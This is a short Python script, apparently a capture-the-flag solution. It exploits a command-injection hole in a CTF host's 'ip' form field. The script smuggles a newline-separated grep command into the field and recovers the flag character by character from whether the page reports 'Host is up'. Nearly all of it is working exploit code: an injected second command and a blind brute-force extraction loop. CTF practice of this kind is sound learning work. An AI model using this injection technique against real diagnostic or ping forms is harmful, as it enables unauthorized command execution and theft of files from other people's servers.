#!/usr/bin/env python3
import requests

abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

def check(s):
    payload = "\ngrep -i " +s + " flag.txt"
    r = requests.post("http://rsxc.no:9010", data={"ip":payload})
    return r.text.find("Host is up") > 0

flag = "RSXC."
while True:
    for ch in abc:
        tempflag = flag + ch
        if check(tempflag):
            flag = tempflag
            print(flag)
            break
